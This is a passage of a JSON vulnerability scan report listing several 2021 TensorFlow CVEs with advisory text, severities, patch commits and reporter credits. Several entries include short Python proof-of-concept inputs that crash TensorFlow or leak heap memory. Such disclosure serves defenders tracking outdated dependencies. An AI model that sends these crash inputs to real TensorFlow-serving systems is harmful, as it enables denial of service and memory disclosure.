guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
                "markdown": "**Vulnerability CVE-2021-37650**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.5.0|[CVE-2021-37650](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37650)|\n\n### Impact\nThe implementation for `tf.raw_ops.ExperimentalDatasetToTFRecord` and `tf.raw_ops.DatasetToTFRecord` can trigger heap buffer overflow and segmentation fault:\n\n```python\nimport tensorflow as tf\n\ndataset = tf.data.Dataset.range(3)\ndataset = tf.data.experimental.to_variant(dataset)\ntf.raw_ops.ExperimentalDatasetToTFRecord(\n  input_dataset=dataset,\n  filename=`/tmp/output`,\n  compression_type=``)\n```\n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/f24faa153ad31a4b51578f8181d3aaab77a1ddeb/tensorflow/core/kernels/data/experimental/to_tf_record_op.cc#L93-L102) assumes that all records in the dataset are of string type. However, there is no check for that, and the example given above uses numeric types.\n\n### Patches\nWe have patched the issue in GitHub commit [e0b6e58c328059829c3eb968136f17aa72b6c876](https://github.com/tensorflow/tensorflow/commit/e0b6e58c328059829c3eb968136f17aa72b6c876).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360."
              },
              "properties": {
                "security-severity": "7.8",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2021-37637",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-37637"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37637",
              "help": {
                "text": "Vulnerability CVE-2021-37637\nSeverity: high\nFixed Version: 2.5.0\nLink: [CVE-2021-37637](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37637)\n### Impact\nIt is possible to trigger a null pointer dereference in TensorFlow by passing an invalid input to `tf.raw_ops.CompressElement`:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.CompressElement(components=[[]])\n```\n  \nThe [implementation](https://github.com/tensorflow/tensorflow/blob/47a06f40411a69c99f381495f490536972152ac0/tensorflow/core/data/compression_utils.cc#L34) was accessing the size of a buffer obtained from the return of a separate function call before validating that said buffer is valid.\n\n### Patches\nWe have patched the issue in GitHub commit [5dc7f6981fdaf74c8c5be41f393df705841fb7c5](https://github.com/tensorflow/tensorflow/commit/5dc7f6981fdaf74c8c5be41f393df705841fb7c5).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for  more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360. Concurrently, it was resolved in `master` branch as it was also discovered internally and fixed before the report was handled.",
                "markdown": "**Vulnerability CVE-2021-37637**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.5.0|[CVE-2021-37637](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37637)|\n\n### Impact\nIt is possible to trigger a null pointer dereference in TensorFlow by passing an invalid input to `tf.raw_ops.CompressElement`:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.CompressElement(components=[[]])\n```\n  \nThe [implementation](https://github.com/tensorflow/tensorflow/blob/47a06f40411a69c99f381495f490536972152ac0/tensorflow/core/data/compression_utils.cc#L34) was accessing the size of a buffer obtained from the return of a separate function call before validating that said buffer is valid.\n\n### Patches\nWe have patched the issue in GitHub commit [5dc7f6981fdaf74c8c5be41f393df705841fb7c5](https://github.com/tensorflow/tensorflow/commit/5dc7f6981fdaf74c8c5be41f393df705841fb7c5).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for  more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360. Concurrently, it was resolved in `master` branch as it was also discovered internally and fixed before the report was handled."
              },
              "properties": {
                "security-severity": "7.7",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2021-37635",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-37635"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37635",
              "help": {
                "text": "Vulnerability CVE-2021-37635\nSeverity: high\nFixed Version: 2.5.0\nLink: [CVE-2021-37635](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37635)\n### Impact\nThe implementation of sparse reduction operations in TensorFlow can trigger accesses outside of bounds of heap allocated data:\n\n```python\nimport tensorflow as tf\n\nx = tf.SparseTensor(\n      indices=[[773, 773, 773], [773, 773, 773]],\n      values=[1, 1],\n      dense_shape=[337, 337, 337])\ntf.sparse.reduce_sum(x, 1)\n```\n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/a1bc56203f21a5a4995311825ffaba7a670d7747/tensorflow/core/kernels/sparse_reduce_op.cc#L217-L228) fails to validate that each reduction group does not overflow and that each corresponding index does not point to outside the bounds of the input tensor.\n\n### Patches\nWe have patched the issue in GitHub commit [87158f43f05f2720a374f3e6d22a7aaa3a33f750](https://github.com/tensorflow/tensorflow/commit/87158f43f05f2720a374f3e6d22a7aaa3a33f750). \n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
                "markdown": "**Vulnerability CVE-2021-37635**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.5.0|[CVE-2021-37635](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37635)|\n\n### Impact\nThe implementation of sparse reduction operations in TensorFlow can trigger accesses outside of bounds of heap allocated data:\n\n```python\nimport tensorflow as tf\n\nx = tf.SparseTensor(\n      indices=[[773, 773, 773], [773, 773, 773]],\n      values=[1, 1],\n      dense_shape=[337, 337, 337])\ntf.sparse.reduce_sum(x, 1)\n```\n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/a1bc56203f21a5a4995311825ffaba7a670d7747/tensorflow/core/kernels/sparse_reduce_op.cc#L217-L228) fails to validate that each reduction group does not overflow and that each corresponding index does not point to outside the bounds of the input tensor.\n\n### Patches\nWe have patched the issue in GitHub commit [87158f43f05f2720a374f3e6d22a7aaa3a33f750](https://github.com/tensorflow/tensorflow/commit/87158f43f05f2720a374f3e6d22a7aaa3a33f750). \n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360."
              },
              "properties": {
                "security-severity": "7.3",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2021-37691",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-37691"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37691",
              "help": {
                "text": "Vulnerability CVE-2021-37691\nSeverity: medium\nFixed Version: 2.5.0\nLink: [CVE-2021-37691](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37691)\n### Impact\nAn attacker can craft a TFLite model that would trigger a division by zero error in LSH  [implementation](https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/lite/kernels/lsh_projection.cc#L118).\n\n```cc\nint RunningSignBit(const TfLiteTensor* input, const TfLiteTensor* weight,\n                   float seed) {\n  int input_item_bytes = input-\u003ebytes / SizeOfDimension(input, 0);\n  // ...\n}\n```\n          \nThere is no check that the first dimension of the input is non zero.\n      \n### Patches\nWe have patched the issue in GitHub commit [0575b640091680cfb70f4dd93e70658de43b94f9](https://github.com/tensorflow/tensorflow/commit/0575b640091680cfb70f4dd93e70658de43b94f9).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick thiscommit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for  more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang of Baidu Security.",
                "markdown": "**Vulnerability CVE-2021-37691**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.5.0|[CVE-2021-37691](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37691)|\n\n### Impact\nAn attacker can craft a TFLite model that would trigger a division by zero error in LSH  [implementation](https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/lite/kernels/lsh_projection.cc#L118).\n\n```cc\nint RunningSignBit(const TfLiteTensor* input, const TfLiteTensor* weight,\n                   float seed) {\n  int input_item_bytes = input-\u003ebytes / SizeOfDimension(input, 0);\n  // ...\n}\n```\n          \nThere is no check that the first dimension of the input is non zero.\n      \n### Patches\nWe have patched the issue in GitHub commit [0575b640091680cfb70f4dd93e70658de43b94f9](https://github.com/tensorflow/tensorflow/commit/0575b640091680cfb70f4dd93e70658de43b94f9).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick thiscommit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for  more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang of Baidu Security."
              },
              "properties": {
                "security-severity": "5.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2021-37679",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-37679"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37679",
              "help": {
                "text": "Vulnerability CVE-2021-37679\nSeverity: high\nFixed Version: 2.5.0\nLink: [CVE-2021-37679](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37679)\n### Impact\nIt is possible to nest a `tf.map_fn` within another `tf.map_fn` call. However, if the input tensor is a `RaggedTensor` and there is no function signature provided, code assumes the output is a fully specified tensor and fills output buffer with uninitialized contents from the heap:\n\n```python\nimport tensorflow as tf\nx = tf.ragged.constant([[1,2,3], [4,5], [6]])\nt = tf.map_fn(lambda r: tf.map_fn(lambda y: r, r), x)\nz = tf.ragged.constant([[[1,2,3],[1,2,3],[1,2,3]],[[4,5],[4,5]],[[6]]])\n```\n  \nThe `t` and `z` outputs should be identical, however this is not the case. The last row of `t` contains data from the heap which can be used to leak other memory information.\n\nThe bug lies in the conversion from a `Variant` tensor to a `RaggedTensor`. The [implementation](https://github.com/tensorflow/tensorflow/blob/460e000de3a83278fb00b61a16d161b1964f15f4/tensorflow/core/kernels/ragged_tensor_from_variant_op.cc#L177-L190) does not check that all inner shapes match and this results in the additional dimensions in the above example.\n\nThe same implementation can result in data loss, if input tensor is tweaked:\n\n```python\nimport tensorflow as tf\nx = tf.ragged.constant([[1,2], [3,4,5], [6]])\nt = tf.map_fn(lambda r: tf.map_fn(lambda y: r, r), x) \n```\n\nHere, the output tensor will only have 2 elements for each inner dimension.\n\n### Patches\nWe have patched the issue in GitHub commit [4e2565483d0ffcadc719bd44893fb7f609bb5f12](https://github.com/tensorflow/tensorflow/commit/4e2565483d0ffcadc719bd44893fb7f609bb5f12).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Haris Sahovic.",
                "markdown": "**Vulnerability CVE-2021-37679**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.5.0|[CVE-2021-37679](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37679)|\n\n### Impact\nIt is possible to nest a `tf.map_fn` within another `tf.map_fn` call. However, if the input tensor is a `RaggedTensor` and there is no function signature provided, code assumes the output is a fully specified tensor and fills output buffer with uninitialized contents from the heap:\n\n```python\nimport tensorflow as tf\nx = tf.ragged.constant([[1,2,3], [4,5], [6]])\nt = tf.map_fn(lambda r: tf.map_fn(lambda y: r, r), x)\nz = tf.ragged.constant([[[1,2,3],[1,2,3],[1,2,3]],[[4,5],[4,5]],[[6]]])\n```\n  \nThe `t` and `z` outputs should be identical, however this is not the case. The last row of `t` contains data from the heap which can be used to leak other memory information.\n\nThe bug lies in the conversion from a `Variant` tensor to a `RaggedTensor`. The [implementation](https://github.com/tensorflow/tensorflow/blob/460e000de3a83278fb00b61a16d161b1964f15f4/tensorflow/core/kernels/ragged_tensor_from_variant_op.cc#L177-L190) does not check that all inner shapes match and this results in the additional dimensions in the above example.\n\nThe same implementation can result in data loss, if input tensor is tweaked:\n\n```python\nimport tensorflow as tf\nx = tf.ragged.constant([[1,2], [3,4,5], [6]])\nt = tf.map_fn(lambda r: tf.map_fn(lambda y: r, r), x) \n```\n\nHere, the output tensor will only have 2 elements for each inner dimension.\n\n### Patches\nWe have patched the issue in GitHub commit [4e2565483d0ffcadc719bd44893fb7f609bb5f12](https://github.com/tensorflow/tensorflow/commit/4e2565483d0ffcadc719bd44893fb7f609bb5f12).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Haris Sahovic."
              },
              "properties": {
                "security-severity": "7.1",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2021-37669",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-37669"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37669",
              "help": {
                "text": "Vulnerability CVE-2021-37669\nSeverity: medium\nFixed Version: 2.5.0\nLink: [CVE-2021-37669](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37669)\n### Impact\nAn attacker can cause denial of service in applications serving models using `tf.raw_ops.NonMaxSuppressionV5` by triggering a division by 0:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.NonMaxSuppressionV5(\n  boxes=[[0.1,0.1,0.1,0.1],[0.2,0.2,0.2,0.2],[0.3,0.3,0.3,0.3]],\n  scores=[1.0,2.0,3.0],\n  max_output_size=-1,\n  iou_threshold=0.5,\n  score_threshold=0.5,\n  soft_nms_sigma=1.0,\n  pad_to_max_output_size=True)\n```\n  \nThe [implementation](https://github.com/tensorflow/tensorflow/blob/460e000de3a83278fb00b61a16d161b1964f15f4/tensorflow/core/kernels/image/non_max_suppression_op.cc#L170-L271) uses a user controlled argument to resize a `std::vector`:\n\n```cc\n  const int output_size = max_output_size.scalar\u003cint\u003e()();\n  // ...\n  std::vector\u003cint\u003e selected;\n  // ...\n  if (pad_to_max_output_size) {\n    selected.resize(output_size, 0);\n    // ...\n  }\n```\n    \nHowever, as `std::vector::resize` takes the size argument as a `size_t` and `output_size` is an `int`, there is an implicit conversion to usigned. If the attacker supplies a negative value, this conversion results in a crash.\n\nA similar issue occurs in `CombinedNonMaxSuppression`:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.NonMaxSuppressionV5(\n  boxes=[[[[0.1,0.1,0.1,0.1],[0.2,0.2,0.2,0.2],[0.3,0.3,0.3,0.3]],[[0.1,0.1,0.1,0.1],[0.2,0.2,0.2,0.2],[0.3,0.3,0.3,0.3]],[[0.1,0.1,0.1,0.1],[0.2,0.2,0.2,0.2],[0.3,0.3,0.3,0.3]]]],\n  scores=[[[1.0,2.0,3.0],[1.0,2.0,3.0],[1.0,2.0,3.0]]],\n  max_output_size_per_class=-1,\n  max_total_size=10,\n  iou_threshold=score_threshold=0.5,\n  pad_per_class=True,\n  clip_boxes=True)\n```\n  \n### Patches\nWe have patched the issue in GitHub commit [3a7362750d5c372420aa8f0caf7bf5b5c3d0f52d](https://github.com/tensorflow/tensorflow/commit/3a7362750d5c372420aa8f0caf7bf5b5c3d0f52d) and commit [b5cdbf12ffcaaffecf98f22a6be5a64bb96e4f58](https://github.com/tensorflow/tensorflow/commit/b5cdbf12ffcaaffecf98f22a6be5a64bb96e4f58).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information \nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
                "markdown": "**Vulnerability CVE-2021-37669**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.5.0|[CVE-2021-37669](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37669)|\n\n### Impact\nAn attacker can cause denial of service in applications serving models using `tf.raw_ops.NonMaxSuppressionV5` by triggering a division by 0:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.NonMaxSuppressionV5(\n  boxes=[[0.1,0.1,0.1,0.1],[0.2,0.2,0.2,0.2],[0.3,0.3,0.3,0.3]],\n  scores=[1.0,2.0,3.0],\n  max_output_size=-1,\n  iou_threshold=0.5,\n  score_threshold=0.5,\n  soft_nms_sigma=1.0,\n  pad_to_max_output_size=True)\n```\n  \nThe [implementation](https://github.com/tensorflow/tensorflow/blob/460e000de3a83278fb00b61a16d161b1964f15f4/tensorflow/core/kernels/image/non_max_suppression_op.cc#L170-L271) uses a user controlled argument to resize a `std::vector`:\n\n```cc\n  const int output_size = max_output_size.scalar\u003cint\u003e()();\n  // ...\n  std::vector\u003cint\u003e selected;\n  // ...\n  if (pad_to_max_output_size) {\n    selected.resize(output_size, 0);\n    // ...\n  }\n```\n    \nHowever, as `std::vector::resize` takes the size argument as a `size_t` and `output_size` is an `int`, there is an implicit conversion to usigned. If the attacker supplies a negative value, this conversion results in a crash.\n\nA similar issue occurs in `CombinedNonMaxSuppression`:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.NonMaxSuppressionV5(\n  boxes=[[[[0.1,0.1,0.1,0.1],[0.2,0.2,0.2,0.2],[0.3,0.3,0.3,0.3]],[[0.1,0.1,0.1,0.1],[0.2,0.2,0.2,0.2],[0.3,0.3,0.3,0.3]],[[0.1,0.1,0.1,0.1],[0.2,0.2,0.2,0.2],[0.3,0.3,0.3,0.3]]]],\n  scores=[[[1.0,2.0,3.0],[1.0,2.0,3.0],[1.0,2.0,3.0]]],\n  max_output_size_per_class=-1,\n  max_total_size=10,\n  iou_threshold=score_threshold=0.5,\n  pad_per_class=True,\n  clip_boxes=True)\n```\n  \n### Patches\nWe have patched the issue in GitHub commit [3a7362750d5c372420aa8f0caf7bf5b5c3d0f52d](https://github.com/tensorflow/tensorflow/commit/3a7362750d5c372420aa8f0caf7bf5b5c3d0f52d) and commit [b5cdbf12ffcaaffecf98f22a6be5a64bb96e4f58](https://github.com/tensorflow/tensorflow/commit/b5cdbf12ffcaaffecf98f22a6be5a64bb96e4f58).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information \nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360."
              },
              "properties": {
                "security-severity": "5.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2021-37688",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-37688"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37688",
              "help": {
                "text": "Vulnerability CVE-2021-37688\nSeverity: high\nFixed Version: 2.5.0\nLink: [CVE-2021-37688](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37688)\n### Impact\nAn attacker can craft a TFLite model that would trigger a null pointer dereference, which would result in a crash and denial of service:\n\n```python\nimport tensorflow as tf\n\nmodel = tf.keras.models.Sequential()\nmodel.add(tf.keras.Input(shape=(1, 2, 3)))\nmodel.add(tf.keras.layers.Dense(0, activation=`relu`))\n\nconverter = tf.lite.TFLiteConverter.from_keras_model(model)\ntflite_model = converter.convert()\n\ninterpreter = tf.lite.Interpreter(model_content=tflite_model)\ninterpreter.allocate_tensors()\n\ninterpreter.invoke()\n```\n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/lite/kernels/internal/optimized/optimized_ops.h#L268-L285) unconditionally dereferences a pointer.\n\n```cc\n  if (y4 \u003e 1) {\n    // ...\n  } else {\n    for (int i0 = 0; i0 \u003c y0; ++i0) {\n      const T* input2_data_ptr = nullptr;\n      for (int i1 = 0; i1 \u003c y1; ++i1) {\n        input2_data_ptr = input2_data_reset;\n        for (int i2 = 0; i2 \u003c y2; ++i2) {\n          scalar_broadcast_f(y3, params, *input1_data_ptr, input2_data_ptr,\n                             output_data_ptr);\n        }\n      }\n    }\n  }\n```\n\n### Patches\nWe have patched the issue in GitHub commit [15691e456c7dc9bd6be203b09765b063bf4a380c](https://github.com/tensorflow/tensorflow/commit/15691e456c7dc9bd6be203b09765b063bf4a380c).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang of Baidu Security.",
                "markdown": "**Vulnerability CVE-2021-37688**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.5.0|[CVE-2021-37688](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37688)|\n\n### Impact\nAn attacker can craft a TFLite model that would trigger a null pointer dereference, which would result in a crash and denial of service:\n\n```python\nimport tensorflow as tf\n\nmodel = tf.keras.models.Sequential()\nmodel.add(tf.keras.Input(shape=(1, 2, 3)))\nmodel.add(tf.keras.layers.Dense(0, activation=`relu`))\n\nconverter = tf.lite.TFLiteConverter.from_keras_model(model)\ntflite_model = converter.convert()\n\ninterpreter = tf.lite.Interpreter(model_content=tflite_model)\ninterpreter.allocate_tensors()\n\ninterpreter.invoke()\n```\n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/lite/kernels/internal/optimized/optimized_ops.h#L268-L285) unconditionally dereferences a pointer.\n\n```cc\n  if (y4 \u003e 1) {\n    // ...\n  } else {\n    for (int i0 = 0; i0 \u003c y0; ++i0) {\n      const T* input2_data_ptr = nullptr;\n      for (int i1 = 0; i1 \u003c y1; ++i1) {\n        input2_data_ptr = input2_data_reset;\n        for (int i2 = 0; i2 \u003c y2; ++i2) {\n          scalar_broadcast_f(y3, params, *input1_data_ptr, input2_data_ptr,\n                             output_data_ptr);\n        }\n      }\n    }\n  }\n```\n\n### Patches\nWe have patched the issue in GitHub commit [15691e456c7dc9bd6be203b09765b063bf4a380c](https://github.com/tensorflow/tensorflow/commit/15691e456c7dc9bd6be203b09765b063bf4a380c).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang of Baidu Security."
              },
              "properties": {
                "security-severity": "7.8",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2021-37666",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-37666"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37666",
              "help": {
                "text": "Vulnerability CVE-2021-37666\nSeverity: high\nFixed Version: 2.5.0\nLink: [CVE-2021-37666](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37666)\n### Impact\nAn attacker can cause undefined behavior via binding a reference to null pointer in `tf.raw_ops.RaggedTensorToVariant`:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.RaggedTensorToVariant(\n  rt_nested_splits=[],\n  rt_dense_values=[1,2,3],\n  batched_input=True)\n```\n  \nThe [implementation](https://github.com/tensorflow/tensorflow/blob/460e000de3a83278fb00b61a16d161b1964f15f4/tensorflow/core/kernels/ragged_tensor_to_variant_op.cc#L129) has an incomplete validation of the splits values, missing the case when the argument would be empty.\n\n### Patches\nWe have patched the issue in GitHub commit [be7a4de6adfbd303ce08be4332554dff70362612](https://github.com/tensorflow/tensorflow/commit/be7a4de6adfbd303ce08be4332554dff70362612).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n  \n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
                "markdown": "**Vulnerability CVE-2021-37666**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.5.0|[CVE-2021-37666](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37666)|\n\n### Impact\nAn attacker can cause undefined behavior via binding a reference to null pointer in `tf.raw_ops.RaggedTensorToVariant`:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.RaggedTensorToVariant(\n  rt_nested_splits=[],\n  rt_dense_values=[1,2,3],\n  batched_input=True)\n```\n  \nThe [implementation](https://github.com/tensorflow/tensorflow/blob/460e000de3a83278fb00b61a16d161b1964f15f4/tensorflow/core/kernels/ragged_tensor_to_variant_op.cc#L129) has an incomplete validation of the splits values, missing the case when the argument would be empty.\n\n### Patches\nWe have patched the issue in GitHub commit [be7a4de6adfbd303ce08be4332554dff70362612](https://github.com/tensorflow/tensorflow/commit/be7a4de6adfbd303ce08be4332554dff70362612).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n  \n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360."
              },
              "properties": {
                "security-severity": "7.8",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2021-37676",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-37676"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37676",
              "help": {
